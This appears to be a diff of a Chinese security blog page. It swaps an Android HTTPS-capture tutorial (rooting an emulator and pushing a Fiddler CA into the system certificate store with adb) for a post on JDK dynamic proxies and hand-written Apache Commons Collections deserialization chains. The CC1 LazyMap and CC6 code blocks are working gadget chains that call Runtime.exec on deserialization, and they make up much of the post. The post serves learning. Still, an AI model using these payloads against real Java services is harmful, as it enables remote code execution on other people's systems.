@@ -4,9 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="记一次艰难的APP抓https包, MajorT&#39;s Blog">
-    <meta name="description" content="永远不要放弃，因为成功可能就在下一秒。
-前言这破包抓了我一天，期间各种组件出问题，模拟器更是卡到我自闭（平均不到一分钟卡一次，你就说疯不疯吧，反正我是疯了），好在最后功夫不负有心人，妈妈再也不用担心我抓不到apk的https包啦哈哈哈哈哈（">
+    <meta name="keywords" content="JDK动态代理基础+cc1+cc6手写利用, MajorT&#39;s Blog">
+    <meta name="description" content="大鹏一日同风起，扶摇直上九万里
+什么是动态代理？动态代理是java中的一种设计模式，简单来说，我们直接访问源对象，而是通过一个代理访问。代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。代理类和被代理类应该共">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>记一次艰难的APP抓https包 | MajorT&#39;s Blog</title>
+    <title>JDK动态代理基础+cc1+cc6手写利用 | MajorT&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -333,12 +333,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">记一次艰难的APP抓https包</h1>
+                    <h1 class="description center-align post-title">JDK动态代理基础+cc1+cc6手写利用</h1>
                 </div>
             </div>
         </div>
@@ -362,12 +362,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Android%E6%B8%97%E9%80%8F/">
-                                <span class="chip bg-color">Android渗透</span>
+                            <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">Java安全</span>
                             </a>
                         
-                            <a href="/tags/%E6%8A%93%E5%8C%85/">
-                                <span class="chip bg-color">抓包</span>
+                            <a href="/tags/%E4%BB%A3%E7%A0%81/">
+                                <span class="chip bg-color">代码</span>
                             </a>
                         
                     </div>
@@ -378,8 +378,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/APP%E6%B8%97%E9%80%8F/" class="post-category">
-                                APP渗透
+                            <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="post-category">
+                                Java安全
                             </a>
                         
                     </div>
@@ -391,21 +391,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-04-10
+                    2024-04-19
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-04-10
+                    2024-04-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1k
+                    2.6k
                 </div>
                 
 
@@ -427,18 +427,26 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><em><strong>永远不要放弃，因为成功可能就在下一秒。</strong></em></p>
-<h1><span id="前言">前言</span></h1><p>这破包抓了我一天，期间各种组件出问题，模拟器更是卡到我自闭（平均不到一分钟卡一次，你就说疯不疯吧，反正我是疯了），好在最后功夫不负有心人，妈妈再也不用担心我抓不到apk的https包啦哈哈哈哈哈（人已疯），抓包成功后赶紧写篇笔记记下来，我的记忆力是靠不住的。自嘲.jpg</p>
-<h1><span id="环境准备">环境准备</span></h1><p>夜神模拟器7（Android9）   <a target="_blank" rel="noopener" href="https://en.bignox.com/">https://en.bignox.com/</a> （我下的海外版）<br>Fiddler<br>magisk   <a target="_blank" rel="noopener" href="https://huskydg.github.io/magisk-files/">https://huskydg.github.io/magisk-files/</a> （26.4）<br>LSPosed   <a target="_blank" rel="noopener" href="https://github.com/LSPosed/LSPosed/releases">https://github.com/LSPosed/LSPosed/releases</a>  （LSPosed-v1.9.2-7024-zygisk-release.zip)<br>算法助手    <a target="_blank" rel="noopener" href="https://github.com/Xposed-Modules-Repo/com.junge.algorithmaide/releases/tag/212-2.1.2">https://github.com/Xposed-Modules-Repo/com.junge.algorithmaide/releases/tag/212-2.1.2</a></p>
-<h1><span id="安装模拟器">安装模拟器</span></h1><p>这里就不赘述了（略）</p>
-<h1><span id="安装magisk">安装Magisk</span></h1><p>安装之前确保模拟器开启root（国内的模拟器默认开启，国际版需要手动开启），保存设置后重启模拟器<br><img src="/images/4/Image1.png" alt="img1"><br>直接将下载的Magisk拖到模拟器安装<br><img src="/images/4/Image2.png" alt="img2"><br>永久记住并允许<br><img src="/images/4/Image3.png" alt="img3"><br>出现如下页面：<br><img src="/images/4/Image4.png" alt="img4"><br>这里先退出Magisk并清理后台，然后再次打开回到上述页面，点击右边的“安装”<br><img src="/images/4/Image5.png" alt="img5"><br><img src="/images/4/Image6.png" alt="img6"><br>直接下一步<br><img src="/images/4/Image7.png" alt="img7"><br>选择直接安装（直接修改&#x2F;system）（如果上一步不退出再重新打开的话，这里方式里面不会有后面两个选项）<br><img src="/images/4/Image8.png" alt="img8"><br><img src="/images/4/Image9.png" alt="img9"><br>不要直接点击右下角的重启（会卡住），叉掉模拟器选择重启</p>
-<h1><span id="安装lsposed">安装LSPosed</span></h1><p>模拟器重启后，选择右上角设置，打开Zygisk（然后重启）<br>将下载的LSPosed拖到模拟器中（所有弹窗点允许），在文件助手中可以看到，安卓路径为&#x2F;sdcard&#x2F;Picture<br><img src="/images/4/Image10.png" alt="img10"><br>打开Magisk<br><img src="/images/4/Image11.png" alt="img11"><br>模块-从本地安装-左上角三个杠-Amaze，在picture文件夹下选择刚才的压缩包<br><img src="/images/4/Image12.png" alt="img12"><br>点击确定<br><img src="/images/4/Image13.png" alt="img13"><br>重启（麻了）<br>解压缩LSPosed，将manager.apk拖到模拟器安装，打开弹窗点击确定即可<br><img src="/images/4/Image14.png" alt="img14"></p>
-<h1><span id="安装算法助手">安装算法助手</span></h1><p>拖到模拟器安装即可（略）</p>
-<h1><span id="fiddler设置">Fiddler设置</span></h1><p><img src="/images/4/Image15.png" alt="img15"><br><img src="/images/4/Image16.png" alt="img16"></p>
-<h1><span id="安装证书到根目录">安装证书到根目录</span></h1><p>导出fidder证书（Tools-Options-HTTPS-右边Actions-Export Root Certificate to Desktop)<br><img src="/images/4/Image17.png" alt="img17"><br>使用kali自带的openssl工具转换一下<br>openssl x509 -inform DER -in FiddlerRoot.cer -out cacert.pem<br>openssl x509 -inform PEM -subject_hash_old -in cacert.pem<br>然后重命名 mv cacert.pem 269953fb.0<br><img src="/images/4/Image18.png" alt="img18"><br>将重命名后的文件复制到物理机备用<br>模拟器右键，打开文件夹所在位置，目录下就有adb工具<br><img src="/images/4/Image19.png" alt="img19"><br>adb.exe devices 查看运行中的设备<br>adb.exe push C:\Users\MajorT\Desktop\269953fb.0 &#x2F;sdcard&#x2F; 将证书推入到sdcard中<br>adb.exe shell 进入shell交互模式<br>mount -o remount,rw &#x2F;system 重新挂载写入system<br>cp &#x2F;sdcard&#x2F;269953fb.0 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F; 将证书复制到系统安全目录<br>chmod 644 &#x2F;system&#x2F;etc&#x2F;security&#x2F;cacerts&#x2F;269953fb.0 赋予证书读写权限<br>reboot 重启<br>重启完成后，打开设置-安全性和位置信息-加密与凭据-信任的凭据，可以看到fiddler证书安装成功<br><img src="/images/4/Image20.png" alt="img20"></p>
-<h1><span id="配置网络代理">配置网络代理</span></h1><p>代理ip为本机地址，端口为fiddler端口<br><img src="/images/4/Image21.png" alt="img21"></p>
-<h1><span id="抓包测试">抓包测试</span></h1><p>装个知乎<br><img src="/images/4/Image22.png" alt="img22"><br>打开知乎，这里可以看到抓不到https的包<br><img src="/images/4/Image23.png" alt="img23"><br>打开LSPosed，在模块中启用算法助手，勾选知乎<br><img src="/images/4/Image24.png" alt="img24"><br>打开算法助手显示常见问题，后台退出后重新打开（确保模拟器开启了Root），勾选知乎，然后点击知乎，如下图设置<br><img src="/images/4/Image25.png" alt="img25"><br>后台退出知乎重新打开<br>哦耶~<br><img src="/images/4/Image26.png" alt="img26"><br>以上就是APP抓https包的全流程啦，按照本文的步骤基本不会出错，之前看的大多数文章都是使用JustTrustMe模块，我反正是没有成功。另外，我还尝试使用Postern做vpn全局代理模拟器抓包也没成功，也不知道是不是我的问题，老实人.jpg</p>
-<h1><span id="参考链接">参考链接</span></h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ruaki/article/details/135580772">https://blog.csdn.net/Ruaki/article/details/135580772</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_67695717/article/details/131772521">https://blog.csdn.net/m0_67695717/article/details/131772521</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13280?time__1311=mqmxnDBD9DyAw405DIYYK9eWu08ceOeT4D#toc-0">https://xz.aliyun.com/t/13280?time__1311=mqmxnDBD9DyAw405DIYYK9eWu08ceOeT4D#toc-0</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1KP41167LZ/?spm_id_from=333.999.0.0&vd_source=720f4a04de15c9a7120305b59cf4f7df">https://www.bilibili.com/video/BV1KP41167LZ/?spm_id_from=333.999.0.0&amp;vd_source=720f4a04de15c9a7120305b59cf4f7df</a></p>
+                <p><em><strong>大鹏一日同风起，扶摇直上九万里</strong></em></p>
+<h1><span id="什么是动态代理">什么是动态代理？</span></h1><p>动态代理是java中的一种设计模式，简单来说，我们直接访问源对象，而是通过一个代理访问。代理模式可以在不修改被代理对象的基础上，通过扩展代理类，进行一些功能的附加与增强。<br>代理类和被代理类应该共同实现一个接口，或者是共同继承某个类。<br>接下来看一些代码<br>首先是我们要被实现的接口IUser</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface IUser &#123;</span><br><span class="line">    public void show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后是实现IUser接口的类UserImpl</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class UserImpl implements IUser&#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void show()&#123;</span><br><span class="line">        System.out.println(&quot;展示&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后是代理了UserImpl类的代理类UserProxy</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class UserProxy implements IUser&#123;</span><br><span class="line">    IUser iUser;</span><br><span class="line"></span><br><span class="line">    public UserProxy(IUser iUser)&#123;</span><br><span class="line">        this.iUser = iUser;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void show()&#123;</span><br><span class="line">        System.out.println(&quot;调用了show&quot;);</span><br><span class="line">        iUser.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接下来写一个测试类ProxyTest<br><img src="/images/5/Image1.png" alt="img1"><br>上述流程看起来没什么问题，那是因为UserImpl类中只实现了一个方法，真实情况往往不会这么简单，需要调用的类中往往有许多方法，所以对于代理类来说，就是一件非常麻烦的事情，原始类中所有的方法，代理类中都要添加，这样我们才能在调用代理类时，调用到原始类的对应方法。<br>这样显然是非常麻烦的，我们假设，如果代理类可以获取我们要调用的方法，然后类似于反射，根据获取的方法名反射调用原始类的方法就好了。<br>而这就需要引入JDK中的一个技术——动态代理。<br>这里需要用到Proxy类的newProxyInstance,从名称可以看出来，就是新建一个调用接口<br>结合上面的静态代理，我们先来思考一下，作为一个代理类，我们需要什么呢？<br>1、需要代理的接口；<br>2、代理类中需要做的事情；<br>3、调用一个类加载的东西，我们是在测试类中实例化的Proxy类，源码当中是没有的，我们要去加载它，所以需要一个ClassLoader。<br>我们进去Proxy类中看看<br><img src="/images/5/Image2.png" alt="img2"><br>第一个参数为类加载器，classloader，固定写法；第二个参数为我们需要代理的接口，固定写法；第三个参数即为要做的事情，需要我们自己传给它，可以看到参数类型为InvocationHander，应该和反射有些关系，进去看看<br><img src="/images/5/Image3.png" alt="img3"><br>可以看到这是一个接口，其中只有一个方法invoke，所以我们需要新建类实现这个接口，把我们新建的类的对象传入newProxyInstance中，invoke方法第二个参数即我们调用的方法，这里为show()方法；第三个参数为方法的参数值。<br>我们来写实现这个接口的类UserInvocationHandler：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class UserInvocationHandler implements InvocationHandler &#123;</span><br><span class="line">    IUser iUser;</span><br><span class="line">    public UserInvocationHandler()&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public UserInvocationHandler(IUser iUser)&#123;</span><br><span class="line">        this.iUser = iUser;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">        method.invoke(iUser, args);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码中，我们在构造函数中传入实现了我们接口的原始类对象，就直接invoke反射调用了该类的方法；这里无论外部调用了什么，invoke方法都会捕获到，并调用对应的方法。<br>接下来来写我们的测试方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class ProxyTest &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        //直接调用UserImpl类</span><br><span class="line">        IUser userimpl = new UserImpl();</span><br><span class="line">        // userimpl.show();</span><br><span class="line">        //</span><br><span class="line">        // //调用UserImpl类的代理类</span><br><span class="line">        // IUser userproxy = new UserProxy(userimpl);</span><br><span class="line">        // userproxy.show();</span><br><span class="line">        InvocationHandler userinvocationhandler = new UserInvocationHandler(userimpl);</span><br><span class="line">        //代理的接口，要做的事情，类加载器</span><br><span class="line">        IUser iUser = (IUser) Proxy.newProxyInstance(userimpl.getClass().getClassLoader(), userimpl.getClass().getInterfaces(),userinvocationhandler);</span><br><span class="line">        iUser.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>userimpl.getClass().getClassLoader()和userimpl.getClass().getInterface()为固定写法，记住就好<br>第二个参数（class数组）也可以换一种写法，因为这里我们知道实现的接口是IUser，所以可以写为new Class&lt;?&gt;[]{IUser.class}，执行效果一样。<br>以上就是JDK动态代理，接下来学习CommonsCollections1的另外一条链，动态代理为其前置知识。</p>
+<h1><span id="commonscollections1另一条链lazymap">CommonsCollections1另一条链（LazyMap)</span></h1><p>在上一篇中，我们查找调用了危险函数InvokeTransformer(transform)方法的上一个方法是TransformMap(checkSetValue)，而这一条链从这里开始不同，为LazyMap(get)<br><img src="/images/5/Image4.png" alt="img4"><br>get方法代码如下，只要factory为我们可控，就可以将其传值为实现了Transformer接口的类的对象，但是我们要走到调用transform方法的地方，需要先进入一个if。<br>这里类如其名，为什么叫LazyMap，当调用类中的get方法时，它会偷个懒，判断调用它的map中是否存在key，存在的话直接返回key值，不存在才会进入if调用transform方法，这里要注意一下。<br><img src="/images/5/Image5.png" alt="img5"><br>下图的factory的调用与TransformdMap不能说是很相似，只能说是一摸一样。。。factory参数可以在构造函数中传入，而构造函数被protected修饰，被decorate函数调用，所以可通过decorate函数传参。<br><img src="/images/5/Image6.png" alt="img6"><br><img src="/images/5/Image7.png" alt="img7"><br><img src="/images/5/Image8.png" alt="img8"><br>至于key是否可控，我们就要去查找谁调用了get方法。这里还是在AnnotationInvocationHandler中，我们在这个类中找到了5个get方法调用。其中3个被memberValues调用，1个被memberTypes调用，1个被annotationType.members()调用，那我们到底用哪个呢？其中后两个是我们不可控的，我们看看memberValues（需要map对象调用，所以必须可控）<br>它可以通过构造函数传入：<br><img src="/images/5/Image9.png" alt="img9"><br>我们再来看使用memberValues并调用了get方法的方法，发现了invoke函数，这不就是动态代理？这里AnnotationInvocationHandler类就是动态代理的调用处理器类（相当于前文中的UserInvocationHandler类），无论外面调用了什么方法，都会调用invoke。<br><img src="/images/5/Image10.png" alt="img10"><br>调用处理器类已经有了，此时，只要有一个动态代理类能够使用该处理器，并调用了任意方法，就能够走到invoke。上图可以看到，我们要走到上图中的get方法调用，首先要绕过两个if，即调用的任意方法不为equals，也不能调用有参方法。<br>可以看到，这个方法就在AnnotationInvocationHandler类中的readObject方法中被调用。<br><img src="/images/5/Image11.png" alt="img11"><br><img src="/images/5/Image12.png" alt="img12"><br>入口类，调用链，危险函数都有了，代码实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">    //创建Transform对象的数组，数组中的值为危险函数（transform函数）所在类的对象，最终目的就是调用到这个对象的危险函数（transform函数）</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    //将数组传入ChainedTransformer，返回一个该类的对象</span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">    Constructor annotationinvokationhandlerMethod = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    annotationinvokationhandlerMethod.setAccessible(true);</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) annotationinvokationhandlerMethod.newInstance(Override.class, lazymap);</span><br><span class="line">    Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">    Object o = annotationinvokationhandlerMethod.newInstance(Override.class, mapProxy);</span><br><span class="line">    serilization(o);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br><span class="line">public static void serilization(Object o) throws IOException &#123;</span><br><span class="line">    ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(&quot;cc3.ser&quot;));</span><br><span class="line">    objectOutputStream.writeObject(o);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static Object unserilization(String filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">    Object o = objectInputStream.readObject();</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>好的，我们来顺着捋一遍这个逻辑：<br>在反序列化时，a.调用AnnotationInvocationHandler的readObject方法，改方法的memberValues是mapProxy（动态代理类强转的Map类的对象）；b.因为调用了动态代理，所以会调用处理器类，也就是会走到AnnotationInvocationHandler的invoke方法，该方法调用了get方法（LazyMap的get方法），后面就跟上一节（CommonsCollections1链手写利用）一样了。<br>另外，注意上面这条链和上一篇的调用链需要jdk版本小于等于8u65，8u71及之后的版本中，cc1被修复了，在AnnotationInvocationHandler类中做了调整。</p>
+<h1><span id="commonscollections6">CommonsCollections6</span></h1><p>但是有一条不受java版本限制的利用链，它就是cc6，github地址：<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections6.java</a><br><img src="/images/5/Image13.png" alt="img13"><br>这条链后半部分与cc1相同，前半部分与URLDNS链相似，这条链比较短，并且调用方式都大差不差，这里就不剖析了，贴一下代码(jdk_8u71)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tm = new TiedMapEntry(lazymap, &quot;aaa&quot;);</span><br><span class="line">    HashMap hashMap = new HashMap();</span><br><span class="line">    hashMap.put(tm, &quot;123&quot;);</span><br><span class="line">    serilization(hashMap);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码存在一个问题，就是在序列化的时候依旧会执行，所以可以改写为下面的形式<br>原因：我们的逻辑是反序列化的时候，readObject函数中调用hash函数，hash中调用hashCode，然后一路调用下去，这里的问题是，在序列化的时候，put函数中也会调用hash函数然后把这条链走完，所以我们需要将这条链中的某一个类调用改为无效的。<br>下面代码中将LazyMap本该调用的ChainedTransformer对象改为了ChainedTransformer对象，所以在put的时候无法走完这条链，然后我们利用反射将ChainedTransformer对象放回去，再序列化即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line">    Transformer transformers[] = new Transformer[]&#123;</span><br><span class="line">            new ConstantTransformer(Runtime.class),</span><br><span class="line">            new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">            new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">    Map&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">    Map&lt;Object, Object&gt; lazymap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line"></span><br><span class="line">    TiedMapEntry tm = new TiedMapEntry(lazymap, &quot;aaa&quot;);</span><br><span class="line">    HashMap hashMap = new HashMap();</span><br><span class="line">    hashMap.put(tm, &quot;123&quot;);</span><br><span class="line">    //如果不把key移除，那么反序列化的时候会不会进入下图中的if，也就不会调用ChainedTransformer</span><br><span class="line">    lazymap.remove(&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">    Class c = LazyMap.class;</span><br><span class="line">    Field fac = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">    fac.setAccessible(true);</span><br><span class="line">    fac.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    serilization(hashMap);</span><br><span class="line">    unserilization(&quot;cc3.ser&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>如果上述代码中不一处key值，这里反序列化的时候key值存在，那么就不会进入if。<br><img src="/images/5/Image14.png" alt="img14"><br>（完）</p>
 
                 
             </div>
@@ -465,7 +473,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://majorttt.github.io/2024/04/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84APP%E6%8A%93https%E5%8C%85/">https://majorttt.github.io/2024/04/10/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%89%B0%E9%9A%BE%E7%9A%84APP%E6%8A%93https%E5%8C%85/</a>
+                    <a href="https://majorttt.github.io/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/">https://majorttt.github.io/2024/04/19/JDK%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E5%9F%BA%E7%A1%80-cc1-cc6%E6%89%8B%E5%86%99%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -503,12 +511,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Android%E6%B8%97%E9%80%8F/">
-                                    <span class="chip bg-color">Android渗透</span>
+                                <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">Java安全</span>
                                 </a>
                             
-                                <a href="/tags/%E6%8A%93%E5%8C%85/">
-                                    <span class="chip bg-color">抓包</span>
+                                <a href="/tags/%E4%BB%A3%E7%A0%81/">
+                                    <span class="chip bg-color">代码</span>
                                 </a>
                             
                         </div>
@@ -554,9 +562,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
